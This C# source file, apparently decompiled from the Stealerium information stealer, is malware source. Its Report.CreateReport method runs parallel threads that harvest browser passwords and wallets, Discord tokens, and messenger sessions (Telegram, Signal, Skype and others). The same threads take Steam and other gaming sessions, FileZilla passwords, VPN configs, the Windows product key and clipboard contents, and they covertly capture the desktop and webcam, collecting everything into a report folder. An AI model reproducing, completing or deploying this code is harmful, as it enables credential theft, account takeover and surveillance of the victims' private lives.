using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using Stealerium.Clipper;
using Stealerium.Target;
using Stealerium.Target.Browsers.Chromium;
using Stealerium.Target.Browsers.Edge;
using Stealerium.Target.Browsers.Firefox;
using Stealerium.Target.Gaming;
using Stealerium.Target.Messengers;
using Stealerium.Target.System;
using Stealerium.Target.VPN;

namespace Stealerium.Helpers;

internal sealed class Report
{
	public static bool CreateReport(string sSavePath)
	{
		List<Thread> list = new List<Thread>();
		try
		{
			if (Config.GrabberModule == "1")
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					FileGrabber.Run(sSavePath + "\\Grabber");
				}));
			}
			list.Add(new Thread((ThreadStart)delegate
			{
				Stealerium.Target.Browsers.Chromium.Recovery.Run(sSavePath + "\\Browsers");
				Stealerium.Target.Browsers.Edge.Recovery.Run(sSavePath + "\\Browsers");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Stealerium.Target.Browsers.Firefox.Recovery.Run(sSavePath + "\\Browsers");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Discord.WriteDiscord(Discord.GetTokens(), sSavePath + "\\Messenger\\Discord");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Pidgin.Get(sSavePath + "\\Messenger\\Pidgin");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Outlook.GrabOutlook(sSavePath + "\\Messenger\\Outlook");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Telegram.GetTelegramSessions(sSavePath + "\\Messenger\\Telegram");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Skype.GetSession(sSavePath + "\\Messenger\\Skype");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Element.GetSession(sSavePath + "\\Messenger\\Element");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Signal.GetSession(sSavePath + "\\Messenger\\Signal");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Tox.GetSession(sSavePath + "\\Messenger\\Tox");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Icq.GetSession(sSavePath + "\\Messenger\\ICQ");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Steam.GetSteamSession(sSavePath + "\\Gaming\\Steam");
				Uplay.GetUplaySession(sSavePath + "\\Gaming\\Uplay");
				BattleNet.GetBattleNetSession(sSavePath + "\\Gaming\\BattleNET");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Minecraft.SaveAll(sSavePath + "\\Gaming\\Minecraft");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Wallets.GetWallets(sSavePath + "\\Wallets");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Stealerium.Target.Browsers.Chromium.Extensions.GetChromeWallets(sSavePath + "\\Wallets\\Chrome_Wallet");
				Stealerium.Target.Browsers.Edge.Extensions.GetEdgeWallets(sSavePath + "\\Wallets\\Edge_Wallet");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				FileZilla.WritePasswords(sSavePath + "\\FileZilla");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				ProtonVpn.Save(sSavePath + "\\VPN\\ProtonVPN");
				OpenVpn.Save(sSavePath + "\\VPN\\OpenVPN");
				NordVpn.Save(sSavePath + "\\VPN\\NordVPN");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Directory.CreateDirectory(sSavePath + "\\Directories");
				DirectoryTree.SaveDirectories(sSavePath + "\\Directories");
			}));
			Directory.CreateDirectory(sSavePath + "\\System");
			list.Add(new Thread((ThreadStart)delegate
			{
				ProcessList.WriteProcesses(sSavePath + "\\System");
				ActiveWindows.WriteWindows(sSavePath + "\\System");
			}));
			Thread thread = new Thread((ThreadStart)delegate
			{
				DesktopScreenshot.Make(sSavePath + "\\System");
				WebcamScreenshot.Make(sSavePath + "\\System");
			});
			thread.SetApartmentState(ApartmentState.STA);
			list.Add(thread);
			list.Add(new Thread((ThreadStart)delegate
			{
				Wifi.SavedNetworks(sSavePath + "\\System");
				Wifi.ScanningNetworks(sSavePath + "\\System");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				File.WriteAllText(sSavePath + "\\System\\ProductKey.txt", ProductKey.GetWindowsProductKeyFromRegistry());
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				Logging.Save(sSavePath + "\\System\\Debug.txt");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				SysInfo.Save(sSavePath + "\\System\\Info.txt");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				File.WriteAllText(sSavePath + "\\System\\Clipboard.txt", Clipboard.GetText());
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				InstalledApps.WriteAppsList(sSavePath + "\\System");
			}));
			foreach (Thread item in list)
			{
				item.Start();
			}
			foreach (Thread item2 in list)
			{
				item2.Join();
			}
			return Logging.Log("Report created");
		}
		catch (Exception ex)
		{
			return Logging.Log("Failed to create report, error:\n" + ex, ret: false);
		}
	}
}
